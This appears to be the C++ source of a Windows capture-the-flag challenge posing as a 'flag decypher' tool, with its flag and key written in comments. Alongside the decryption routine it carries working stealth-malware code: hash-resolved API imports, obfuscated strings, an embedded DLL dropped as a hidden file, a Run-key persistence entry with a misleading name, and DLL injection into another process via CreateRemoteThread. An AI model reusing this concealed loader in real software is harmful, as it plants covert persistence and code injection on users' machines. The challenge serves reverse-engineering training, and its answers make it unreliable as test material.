#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <iterator>
#include <codecvt>

#include <Windows.h>
#include <wincrypt.h>
#include <TlHelp32.h>

#include "resource.h"
#include "obfuscate_calls.h"
#include "obfuscate_strings.h"

RESOLVE_TABLE rtSysCallsTable = { {
		{0x7deb3c2b,L"kernel32.dll",NULL},	//GetCurrentProcess			[0]
		{0x0c91118e,L"advapi32.dll",NULL},	//AdjustTokenPrivileges		[1]
		{0x989cbc90,L"advapi32.dll",NULL},	//LookupPrivilegeValueA		[2]		
		{0x1d22a836,L"advapi32.dll",NULL},	//RegCreateKeyW				[3]
		{0x86a022bc,L"advapi32.dll",NULL},	//RegSetValueExW			[4]
		{0xf5c7cdfe,L"kernel32.dll",NULL},	//OpenProcess				[5]
		{0x02cc55a0,L"kernel32.dll",NULL},	//OpenProcessToken			[6]
		{0x956f14e5,L"kernel32.dll",NULL},	//GetModuleFileName			[7]
		{0xdcecd4e8,L"kernel32.dll",NULL},	//Process32FirstW			[8]
		{0xdd66e2c5,L"kernel32.dll",NULL},	//Process32NextW			[9]
		{0x3c11901f,L"kernel32.dll",NULL},	//CloseHandle				[10]
		{0xa22fa1c6,L"kernel32.dll",NULL},	//CreateToolhelp32Snapshot	[11]
		{0x3f8562ec,L"kernel32.dll",NULL},	//GetModuleHandleW			[12]
		{0x52434e72,L"kernel32.dll",NULL},	//GetProcAddress			[13]
		{0x5dd2d148,L"kernel32.dll",NULL},	//VirtualAllocEx			[14]
		{0x3fba5504,L"kernel32.dll",NULL},	//WriteProcessMemory		[15]
		{0xf2f50d7, L"kernel32.dll",NULL},	//CreateRemoteThread		[16]
		{0x9f8ba757,L"kernel32.dll",NULL},  //CreateFileW               [17]
		{0x0e7682a5,L"kernel32.dll",NULL},  //ReadFile					[18]
		{0x505a6588,L"kernel32.dll",NULL},   // WriteFile	    		[19]
		{0x41d40d85,L"kernel32.dll",NULL},  //DeleteFileA				[20]
} };


_GetCurrentProcess hGetCurrentProcess;
_AdjustTokenPrivileges hAdjustTokenPrivileges;
_LookupPrivilegeValueA hLookupPrivilegeValueA;
_RegCreateKeyW hRegCreateKey;
_RegSetValueExW hRegSetValueEx;
_OpenProcess hOpenProcess;
_OpenProcessToken hOpenProcessToken;
_GetModuleFileName hGetModuleFileName;
_Process32FirstW hProcess32FirstW;
_Process32NextW hProcess32NextW;
_CloseHandle hCloseHandle;
_CreateToolhelp32Snapshot hCreateToolhelp32Snapshot;
_GetModuleHandleW hGetModuleHandle;
_GetProcAddress hGetProcAddress;
_VirtualAllocEx hVirtualAllocEx;
_WriteProcessMemory hWriteProcessMemory;
_CreateRemoteThread hCreateRemoteThread;
_CreateFileW hCreateFile;
_ReadFile hReadFile;
_WriteFile hWriteFile;
_DeleteFileA hDeleteFile;

void init_funcs() {
	resolve_init(&rtSysCallsTable, 21);
	hGetCurrentProcess = (_GetCurrentProcess)rtSysCallsTable.reEntries[0].lpAddr;
	hAdjustTokenPrivileges = (_AdjustTokenPrivileges)rtSysCallsTable.reEntries[1].lpAddr;
	hLookupPrivilegeValueA = (_LookupPrivilegeValueA)rtSysCallsTable.reEntries[2].lpAddr;
	hRegCreateKey = (_RegCreateKeyW)rtSysCallsTable.reEntries[3].lpAddr;
	hRegSetValueEx = (_RegSetValueExW)rtSysCallsTable.reEntries[4].lpAddr;
	hOpenProcess = (_OpenProcess)rtSysCallsTable.reEntries[5].lpAddr;
	hOpenProcessToken = (_OpenProcessToken)rtSysCallsTable.reEntries[6].lpAddr;
	hGetModuleFileName = (_GetModuleFileName)rtSysCallsTable.reEntries[7].lpAddr;
	hProcess32FirstW = (_Process32FirstW)rtSysCallsTable.reEntries[8].lpAddr;
	hProcess32NextW = (_Process32NextW)rtSysCallsTable.reEntries[9].lpAddr;
	hCloseHandle = (_CloseHandle)rtSysCallsTable.reEntries[10].lpAddr;
	hCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)rtSysCallsTable.reEntries[11].lpAddr;
	hGetModuleHandle = (_GetModuleHandleW)rtSysCallsTable.reEntries[12].lpAddr;
	hGetProcAddress = (_GetProcAddress)rtSysCallsTable.reEntries[13].lpAddr;
	hVirtualAllocEx = (_VirtualAllocEx)rtSysCallsTable.reEntries[14].lpAddr;
	hWriteProcessMemory = (_WriteProcessMemory)rtSysCallsTable.reEntries[15].lpAddr;
	hCreateRemoteThread = (_CreateRemoteThread)rtSysCallsTable.reEntries[16].lpAddr;
	hCreateFile = (_CreateFileW)rtSysCallsTable.reEntries[17].lpAddr;
	hReadFile = (_ReadFile)rtSysCallsTable.reEntries[18].lpAddr;
	hWriteFile = (_WriteFile)rtSysCallsTable.reEntries[19].lpAddr;
	hDeleteFile = (_DeleteFileA)rtSysCallsTable.reEntries[20].lpAddr;
}


void GetDllPath(const wchar_t* in_dllName, std::wstring& out_dllPath);
void Inject(std::wstring& dllPath, std::wstring& processName);
DWORD GetProcessIdentificator(std::wstring& processName);

BOOL setPrivileges(LPCTSTR szPrivName)
{

	TOKEN_PRIVILEGES tp = { 0 };
	HANDLE hToken = 0;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(hGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return TRUE;
	}


	if (!LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].Luid)) {
		return TRUE;
	}


	if (!hAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
	{
		hCloseHandle(hToken);
		return TRUE;
	}

	return FALSE; // ok!
}

const int PATH_LEN = 128;

void GetDllPath(const wchar_t* in_dllName, std::wstring& out_dllPath) {
	WCHAR currentPath[PATH_LEN];
	hGetModuleFileName(NULL, currentPath, PATH_LEN);
	out_dllPath = currentPath;
	out_dllPath = out_dllPath.substr(0, out_dllPath.find_last_of('\\') + 1);
	out_dllPath.append(in_dllName);
}

DWORD GetProcessIdentificator(std::wstring& processName) {
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = hCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD processId = NULL;
	if (hProcess32FirstW(snapshot, &processEntry)) {
		while (hProcess32NextW(snapshot, &processEntry)) {
			if (!_wcsicmp(processEntry.szExeFile, processName.c_str())) {
				processId = processEntry.th32ProcessID;
				break;
			}
		}
	}
	hCloseHandle(snapshot);
	return processId;
}

std::string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}

std::wstring s2ws(const std::string& str)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.from_bytes(str);
}

BOOL proceed_injection(std::wstring& dllPath, std::wstring& processName)
{
	bool bProcFound = false;
	DWORD processId = NULL;
	while (!bProcFound) {
		processId = GetProcessIdentificator(processName);
		if (processId != NULL) {
			bProcFound = true;
			Sleep(10);
		}
		else {
			continue;
		}
	}
	HANDLE victProc = hOpenProcess(PROCESS_CREATE_THREAD
		| PROCESS_QUERY_INFORMATION
		| PROCESS_VM_OPERATION
		| PROCESS_VM_WRITE
		| PROCESS_VM_READ,
		false,
		processId);

	if (victProc) {
		int dwSize = sizeof(wchar_t) * dllPath.length() + 1;
		LPVOID pPathBuffer = (PWSTR)hVirtualAllocEx(victProc, NULL, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (pPathBuffer == NULL) return false;

		hWriteProcessMemory(victProc, pPathBuffer, dllPath.c_str(), dwSize, NULL);
		if (pPathBuffer == NULL) return false;

		HANDLE hRemoteThread = hCreateRemoteThread(victProc, NULL, 0,
			(PTHREAD_START_ROUTINE)hGetProcAddress(hGetModuleHandle(L"kernel32.dll"), cptime_obf("LoadLibraryW")),
			pPathBuffer, 0, NULL);
		if (hRemoteThread == NULL) return false;
		else {
			hCloseHandle(hRemoteThread);
			return TRUE;
		}
		return FALSE;
	}

	return FALSE;
}


constexpr char hexmap[] = { '0', '1', '2', '3', '4', '5', '6', '7',
						   '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

std::wstring hexStr(unsigned char* data, int len)
{
	std::wstring s(len * 2, ' ');
	for (int i = 0; i < len; ++i) {
		s[2 * i] = hexmap[(data[i] & 0xF0) >> 4];
		s[2 * i + 1] = hexmap[data[i] & 0x0F];
	}
	return s;
}


BOOL inject(){
	init_funcs();

	HRSRC dll_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
	unsigned int dll_size = SizeofResource(NULL, dll_res);
	HGLOBAL dll_handle = LoadResource(NULL, dll_res);
    void* payload = LockResource(dll_handle);

	std::string secret(cptime_obf("secret.dll"));
	std::wstring wsecret = s2ws(secret);
	HANDLE dll = hCreateFile(wsecret.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN,
		NULL);
	
	BOOL bErrorFlag = FALSE;
	DWORD dwBytesWritten = 0;


	if (dll != INVALID_HANDLE_VALUE) {
		bErrorFlag = hWriteFile(
			dll,           
			payload,     
			dll_size,  
			&dwBytesWritten, 
			NULL);
	}
	hCloseHandle(dll);

	//setPrivileges(SE_DEBUG_NAME);
	std::wstring injector_path;
	std::string injector_name(cptime_obf("injector.exe"));
	std::wstring injector_wname = s2ws(injector_name);
	GetDllPath(injector_wname.c_str(), injector_path);
	HKEY hkey = NULL;

	std::string registry_entry(cptime_obf("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
	LONG createStatus = hRegCreateKey(HKEY_CURRENT_USER, s2ws(registry_entry).c_str(), &hkey);
	std::string data(cptime_obf("Check dlls list while running"));
	LONG status = hRegSetValueEx(hkey, s2ws(data).c_str(), 0, REG_SZ, (BYTE*)injector_path.c_str(), (injector_path.size() + 1) * sizeof(wchar_t));
	std::wstring dllPath;

	GetDllPath(wsecret.c_str(), dllPath);
	
	BOOL res = proceed_injection(dllPath, injector_wname);
	if (res) {
		std::cout << cptime_obf("Oh... hi!\n");
	}
	return res;
}

std::string hex_to_string(const std::string& input)
{
	static const char* const lut = "0123456789abcdef";
	size_t len = input.length();
	if (len & 1) {
		std::cout << "Incorrect input!\n";
		exit(0);
	}

	std::string output;
	output.reserve(len / 2);
	for (size_t i = 0; i < len; i += 2)
	{
		char a = input[i];
		const char* p = std::lower_bound(lut, lut + 16, a);
		if (*p != a) {
			std::cout << "Incorrect input!\n";
			exit(0);
		}
		char b = input[i + 1];
		const char* q = std::lower_bound(lut, lut + 16, b);
		if (*q != b) {
			std::cout << "Incorrect input!\n";
			exit(0);
		}

		output.push_back(((p - lut) << 4) | (q - lut));
	}
	return output;
}

void write_flag_to_disk() {
	std::string path("flag.txt");
	HRSRC flag_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int flag_size = SizeofResource(NULL, flag_res);
	HGLOBAL flag_handle = LoadResource(NULL, flag_res);
	void* payload = LockResource(flag_handle);

	std::ofstream f(path.c_str(), std::ios::out | std::ios::binary);
	f.write((char*)payload, flag_size);
	f.close();
	return;
}

void write_key_to_disk() {
	HANDLE hFile;
	std::string key(cptime_obf("080200000166000008000000f10e257c6bce0d34"));
	DWORD dwBytesToWrite = key.length();
	hFile = CreateFile(L"key.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
		NULL);

	BOOL bErrorFlag = FALSE;
	DWORD dwBytesWritten = 0;

	if (hFile != INVALID_HANDLE_VALUE) {
		bErrorFlag = WriteFile(hFile, key.c_str(), dwBytesToWrite, &dwBytesWritten, NULL);
	}
	CloseHandle(hFile);
	return;
}

int main()
{
	
	//6ed33c123c3a792c05e179f17ffd973da83a2932c1ff8da1 - flag
	//080200000166000008000000f10e257c6bce0d34 - key
	//FLAG = "HSE{d0n7_7ry_7o_h1d3}";
	SetErrorMode(100);
	bool patch_me = SetErrorMode(1024) == 100;
	if (patch_me)
		inject();
	
	write_flag_to_disk();
	write_key_to_disk();
		
	std::cout << "I am flag decypher, your nearest fellow!\n";
	std::cout << "I've just dropped out a flag and a key to decrypt it.\n Look for it in the same folder as I am running now.\n" << std::endl;
	std::cout << "Give me a flag to decrypt:\n";
	std::cout << "Flag: ";
	std::string inp;
	std::cin >> inp;
	std::string str_inp = hex_to_string(inp);
	
	PBYTE bFlag = (PBYTE)malloc(str_inp.size() + 1);
	for (std::size_t i = 0; i < str_inp.size(); i++) {
		bFlag[i] = str_inp[i];
	}
	bFlag[str_inp.size()] = 0;

	std::cout << "Now give me a key:\n";
	std::cout << "Key: ";
	std::string key;
	std::cin >> key;
	std::string key_inp = hex_to_string(key);
	
	std::cout << std::endl;
	
	HCRYPTPROV hCryptProv = NULL;
	BYTE bKey[20];
	for (std::size_t i = 0; i < key_inp.size(); i++) {
		bKey[i] = key_inp[i];
	}


	LPCWSTR lpwContextName = L"Flag";
	BOOL bIsSecceeded = CryptAcquireContext(&hCryptProv, lpwContextName, NULL, PROV_RSA_FULL, 0);                      

	if (!bIsSecceeded)
		bIsSecceeded = CryptAcquireContext(&hCryptProv, lpwContextName, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET);       

	HCRYPTKEY hKey;
	CryptImportKey(hCryptProv, bKey, sizeof(bKey), 0, CRYPT_EXPORTABLE, &hKey);

	DWORD dwEncLen = 0x18;
	bIsSecceeded = CryptDecrypt(hKey, NULL, TRUE, CRYPT_OAEP, bFlag, &dwEncLen);

	std::cout << "Your flag: ";

	for (auto i = 0; i < 22; i++) {
		std::cout << bFlag[i];
	}

	std::cout << std::endl;

	CryptDestroyKey(hKey);

	CryptReleaseContext(hCryptProv, 0);

	hDeleteFile(cptime_obf("secret.dll"));
}